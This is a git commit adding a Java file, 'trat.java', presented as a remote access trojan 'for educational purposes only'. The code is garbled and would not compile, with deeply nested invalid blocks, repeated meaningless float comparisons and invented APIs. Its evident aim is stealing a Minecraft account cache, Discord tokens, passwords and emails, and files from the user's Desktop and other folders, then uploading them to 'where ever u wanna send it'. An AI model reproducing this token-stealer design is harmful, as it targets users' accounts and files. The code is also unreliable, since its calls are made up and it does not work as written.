1931083a426133fe8d2df8071e565e3742e6ea94
FERDdeveloper <86313430+FERDdeveloper@users.noreply.github.com>
2021-10-27 19:44:16 +0200

    uwu

---
+++ net/ferderplays/trat.java
@@ -0,0 +1,156 @@
+package net.ferderplays;
+
+public class trat {
+    /**
+     * @author ferderplays
+     * @description theunique rat
+     * 
+     * for educational purposes only!
+     * don't ever use this rat to hack someone cause then u will go to jail.
+     */
+    void runned() {
+        public block1 {
+            private boolean block2 {
+                boolean block3 {
+                    private boolean block4 {
+                        boolean block5 {
+                            private boolean block6 {
+                                boolean block7 {
+                                    private boolean block8 {
+                                        boolean block9 {
+                                            private boolean block10 {
+                                                boolean block11 {
+                                                    private boolean block12 {
+                                                        boolean block13 {
+                                                            private boolean block14 {
+                                                                boolean block15 {
+                                                                    var1[1] = 0;
+                                                                    for (var1[2] = 6) {
+                                                                        var1[2] = 6;
+                                                                        var6 = "error";
+                                                                        var1[7] = 8;
+                                                                        if (var1[7] == 0) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 0.1) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 0.2) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 0.3) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 0.4) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 0.5) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 0.6) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 0.7) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 0.8) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 0.9) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 1) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 1.1) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 1.2) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 1.3) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 1.4) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 1.5) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 1.6) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 1.7) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 1.8) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 1.9) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 2) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 2.1) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 2.2) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 2.3) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 2.4) {
+                                                                            return new var6(); //not working error
+                                                                        } else if (var1[7] == 8) {
+                                                                            public static cases() {
+                                                                                case 1:
+                                                                                    short 1
+                                                                                    break;
+                                                                                    case 2:
+                                                                                        short 2
+                                                                                        break;
+                                                                                        case 3:
+                                                                                            short 3
+                                                                                            break;
+                                                                                            case 4: 
+                                                                                                short 4
+                                                                                                void createDirectory() {
+                                                                                                    this.createDirectory("AutoRAT").inPath("user.home" + "/AppData/Roaming");
+                                                                                                    if (this.deletedDirectory("AutoRAT")) {
+                                                                                                        this.createDirectory("AutoRAT").inPath("user.home" + "/AppData/Roaming");
+                                                                                                    }
+                                                                                                }
+                                                                                                void Trayaka() {
+                                                                                                    lulz = new ArrayList<String>();
+                                                                                                    String thu = lulz.add("user.home" + "/AppData/Roaming/.minecraft");
+                                                                                                    String thu1 = lulz.add("user.home" + "/AppData/Local/discord/Local Storage/levedb");
+                                                                                                    String thu2 = lulz.add("user.home" + "/Desktop");
+                                                                                                    String thu3 = lulz.add("user.home" + "/Future");
+                                                                                                    String thu4 = lulz.add("user.home" + "/Downloads");
+                                                                                                    String thu5 = lulz.add("user.home" + "/Pictures/screenshots");
+                                                                                                    String thu5 = lulz.add("user.home" + "/Documents/Github");
+                                                                                                    if (thu) {
+                                                                                                        byte uk1 = "accountcache.json"; this.getFile(uk1);
+                                                                                                        if (this.getFile(uk1)) {
+                                                                                                            System.upload(uk1).toPath("where ever u wanna send it");
+                                                                                                        }
+                                                                                                    }
+                                                                                                    if (thu1) {
+                                                                                                        byte uk2 = ".ldb" + filename; this.getFile(uk2);
+                                                                                                        if (this.getFile(uk2)) {
+                                                                                                            int token = this.Discord.revealToken().fromFile(uk2);
+                                                                                                            String tokenlogger1 = this.Discord.getAccountPassword().from(token);
+                                                                                                            String tokenlogger2 = this.Discord.getAccountEmail().from(token);
+                                                                                                            if (tokenlogger1) {
+                                                                                                                System.upload(tokenlogger1).toPath("where ever u wanna send it");
+                                                                                                            }
+                                                                                                            if (tokenlogger2) {
+                                                                                                                System.upload(tokenlogger2).toPath("where ever u wanna send it");
+                                                                                                            }
+                                                                                                        }
+                                                                                                    }
+                                                                                                    if (thu2) {
+                                                                                                        byte uk3 = ".jar" + filename; this.getFile(uk3);
+                                                                                                        if (this.getFile(uk3)) {
+                                                                                                            System.upload(uk3).toPath("where ever u wanna send it");
+                                                                                                        }
+                                                                                                    }
+                                                                                                }
+                                                                            }
+                                                                        }
+                                                                    }
+                                                                }
+                                                            }
+                                                        }
+                                                    }
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
